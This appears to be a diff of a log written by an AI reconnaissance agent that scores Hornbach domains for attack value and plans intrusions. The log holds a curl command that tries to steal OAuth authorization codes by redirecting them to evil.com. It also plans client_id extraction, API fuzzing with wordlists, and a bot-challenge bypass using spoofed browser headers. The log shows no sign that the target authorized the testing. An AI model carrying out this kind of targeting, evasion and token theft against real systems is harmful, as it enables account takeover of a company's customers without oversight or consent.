@@ -1,1 +1,39 @@
-## 2026-09-04 00:43:33 UTC [target] (model nemotron3)
+## 2026-09-04 05:17:46 UTC [target] (model nemotron3)
+[PRIO] auth.hornbach.com,8.65,attack_surface=9,business_value=9,tech_exposure=9,gate_ease=10,cloud_surface=8,freshness=5
+[PRIO] api.hornbach.de,6.85,attack_surface=6,business_value=8,tech_exposure=5,gate_ease=10,cloud_surface=7,freshness=4
+[PRIO] b2b.hornbach.com,5.55,attack_surface=5,business_value=7,tech_exposure=4,gate_ease=10,cloud_surface=5,freshness=5
+[HYP] OAuth redirect_uri validation bypass on authz-srv/authz
+class: OATH
+asset: auth.hornbach.com/authz-srv/authz
+confidence: 50
+reasoning: Authorization endpoint live at authz-srv/authz; returns verbose invalid_client error with error_description/error_hint; redirect_uri parameter accepted before client validation per OAuth flow; cidaas CIAM may use regex/wildcard matching for redirect_uri allowlists
+evidence_needed: Valid client_id + redirect_uri variations (https://evil.com, https://hornbach.de.evil.com, https://hornbach.de@evil.com, path traversal) accepted and authorization code delivered to attacker URI
+verify_steps: 1) Obtain valid client_id from hornbach.de frontend JS bundles (bypass bot challenge); 2) curl -s -D- "https://auth.hornbach.com/authz-srv/authz?response_type=code&client_id=<found>&redirect_uri=https://evil.com&scope=openid" --max-redirs 0; 3) Test redirect_uri variations if login page returned
+impact: OAuth authorization code theft → access/refresh tokens → full account takeover (OATH class, HIGH)
+testability: AUTH_HELPED
+[HYP] cidaas OAuth client_id enumeration via authorize endpoint
+class: AUTH
+asset: auth.hornbach.com/authz-srv/authz
+confidence: 50
+reasoning: Authorize endpoint returns detailed invalid_client errors for guessed client_ids; valid client_id would return HTTP 200 (login/consent page) or 302 (redirect) instead of 302 to error page; cidaas uses numeric/UUID client_ids
+evidence_needed: Valid client_id returns HTTP 200 or 302 to consent page instead of 302 to /identity/error; client_id references found in hornbach.de frontend JS or auth.hornbach.com HTML/JS
+verify_steps: 1) Bypass bot challenge on www.hornbach.de/customer to access login page JS bundles; 2) Extract client_id from JS/config; 3) Test candidate client_ids against authz-srv/authz
+impact: Valid client_id enables OAuth flow testing for redirect_uri bypass, PKCE downgrade, state fixation (AUTH class, MEDIUM-HIGH)
+testability: PASSIVE
+[HYP] API gateway hidden endpoint enumeration on api.hornbach.de
+class: OTHER
+asset: api.hornbach.de
+confidence: 40
+reasoning: API gateway exists (Gateway server header, JSON error responses); all common paths return 404; may have undocumented endpoints for mobile/app/b2b integrations
+evidence_needed: Hidden endpoint returns 200 with API functionality (GraphQL introspection, REST resources, Swagger/OpenAPI spec)
+verify_steps: 1) Fuzz common API paths with wordlist (feroxbuster/ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt); 2) Test GraphQL introspection on /graphql, /api/graphql, /v1/graphql; 3) Check for OpenAPI spec at /openapi.json, /swagger.json, /api-docs
+impact: Undocumented API access → data exposure, BOLA/IDOR, business logic flaws (MEDIUM)
+testability: PASSIVE
+[PARKED] API gateway hidden endpoint enumeration on api.hornbach.de: confidence 40 at threshold; fuzzing-only verify steps with no specific target
+[FINAL] 1. OAuth redirect_uri validation bypass on authz-srv/authz (confidence 50, AUTH_HELPED, HIGH)
+[FINAL] 2. cidaas OAuth client_id enumeration via authorize endpoint (confidence 50, PASSIVE, MEDIUM-HIGH)
+[NEXT] PROBE: curl -s -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Accept-Language: de-DE,de;q=0.9,en;q=0.8" -b "choosenLanguage=de_DE" "https://www.hornbach.de/customer" -v — attempt to bypass bot challenge with browser-like headers to access login page JS for client_id extraction
+[LEARN] REJECTED class AUTH @ auth.hornbach.com/apps-srv/clients/register: POST returns 404 — unauthenticated dynamic client registration (RFC 7591) not enabled
+[LEARN] ACCEPTED class OATH @ auth.hornbach.com/authz-srv/authz: authorization endpoint live with verbose error messages; redirect_uri validation testing requires valid client_id
+[LEARN] ACCEPTED class OTHER @ api.hornbach.de: API gateway exists (Gateway server header) but no documented endpoints discovered at common paths
+[RISK] hornbach: 70 — Auth surface (cidaas CIAM) fully exposed via OIDC discovery with 6+ service endpoints; unauthenticated client registration disabled. Bot-protected www.hornbach.de fronts actual login and leaks client_id in frontend JS. API gateway (api.hornbach.de) discovered but no endpoints enumerated. Priority: bypass bot challenge to extract client_id, then test OAuth redirect_uri validation.
